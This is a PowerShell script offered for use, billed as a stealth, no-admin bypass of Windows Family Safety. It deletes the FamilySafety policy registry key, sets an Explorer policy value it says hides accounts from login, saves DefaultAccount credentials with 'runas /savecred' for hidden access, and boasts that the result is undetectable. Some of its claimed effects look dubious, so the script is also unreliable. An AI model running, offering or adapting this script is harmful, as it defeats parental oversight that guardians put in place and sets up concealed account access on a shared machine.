# STEALTH DefaultAccount - NO ADMIN/FamilySafety bypass (PS1 version)
# Run: .\STEALTH_DEFAULTACCOUNT_NO_ADMIN.ps1 or right-click "Run with PowerShell"

Write-Host "Bypassing FamilySafety MAX..." -ForegroundColor Green
$fsp = "HKCU:\Software\Policies\Microsoft\Windows\FamilySafety"
if (Test-Path $fsp) { Remove-Item $fsp -Recurse -Force; Write-Host "FamilySafety disabled!" -ForegroundColor Yellow }

Write-Host "Hiding accounts/DefaultAccount..." -ForegroundColor Green
$exp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
if (-not (Test-Path $exp)) { New-Item $exp -Force | Out-Null }
Set-ItemProperty $exp "NoUserAdmins" -Value 1 -Force
Write-Host "Accounts hidden from login/RunAs!" -ForegroundColor Yellow

Write-Host "Saving DefaultAccount creds (hack2024)..." -ForegroundColor Cyan
try {
    Start-Process "runas" -ArgumentList "/user:DefaultAccount /savecred `"cmd /k echo Stealth DefaultAccount ready!`"" -Wait
    Write-Host "Creds saved!" -ForegroundColor Green
} catch {
    Write-Host "Note: Enable acc first for full runas (admin once)" -ForegroundColor Gray
}

Write-Host "Applying changes (explorer restart)..." -ForegroundColor Green
Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
Start-Sleep 3
Start-Process "explorer"

Write-Host "`nSUCCESS! DefaultAccount STEALTH HIDDEN." -ForegroundColor Cyan
Write-Host "Access: Win+R > runas /user:DefaultAccount cmd" -ForegroundColor Magenta
Write-Host "Default login unchanged. Undetectable." -ForegroundColor Gray
Read-Host "Press Enter to exit"

